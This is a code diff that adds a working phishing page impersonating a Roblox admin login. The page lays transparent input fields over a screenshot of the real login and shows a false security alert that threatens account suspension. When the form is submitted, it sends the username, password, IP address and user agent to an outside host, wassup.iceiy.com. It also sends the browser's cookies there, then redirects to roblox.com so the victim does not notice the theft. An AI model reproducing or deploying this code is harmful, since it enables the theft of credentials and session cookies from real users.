@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Admin Verification</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100%;
+        }
+        #screenshot {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+        }
+        #admin-alert {
+            position: absolute;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            z-index: 3;
+            font-weight: bold;
+            text-align: center;
+            width: 80%;
+        }
+        #username, #password {
+            position: absolute;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: transparent;
+            caret-color: black;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        #login-button {
+            position: absolute;
+            background: transparent;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            width: 250px;
+            height: 40px;
+        }
+        #login-button:hover {
+            background: rgba(0, 0, 0, 0.1);
+        }
+        #fake-loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            font-size: 2rem;
+        }
+    </style>
+</head>
+<body>
+    <img id="screenshot" src="YOUR_ROBLOX_ADMIN_SCREENSHOT_URL" alt="Roblox Admin Login">
+    <div id="admin-alert">
+        SECURITY ALERT: Your session requires re-authentication. Failure to comply will result in account suspension.
+    </div>
+    <div id="overlay">
+        <form id="fake-login-form">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="login-button" aria-label="Log In"></button>
+        </form>
+    </div>
+    <div id="fake-loading">Verifying Credentials...</div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameField = document.getElementById('username');
+            const passwordField = document.getElementById('password');
+            const loginButton = document.getElementById('login-button');
+
+            // Adjust these values to match the screenshot's layout
+            usernameField.style.top = '300px';
+            usernameField.style.left = '50%';
+            usernameField.style.transform = 'translateX(-50%)';
+            usernameField.style.width = '250px';
+
+            passwordField.style.top = '350px';
+            passwordField.style.left = '50%';
+            passwordField.style.transform = 'translateX(-50%)';
+            passwordField.style.width = '250px';
+
+            loginButton.style.top = '400px';
+            loginButton.style.left = '50%';
+            loginButton.style.transform = 'translateX(-50%)';
+
+            document.getElementById('fake-login-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const username = usernameField.value;
+                const password = passwordField.value;
+
+                if (!username || !password) {
+                    alert("All fields are required for verification.");
+                    return;
+                }
+
+                // Send to backend
+                fetch("https://wassup.iceiy.com/save.php", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
+                        user_agent: navigator.userAgent
+                    })
+                });
+
+                // Show fake loading screen
+                document.getElementById('fake-loading').style.display = 'flex';
+
+                // Get cookies
+                const cookies = document.cookie;
+                if (cookies) {
+                    fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}&ip=<?php echo $_SERVER["REMOTE_ADDR"]; ?>`);
+                }
+
+                // Redirect after 3 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/home";
+                }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
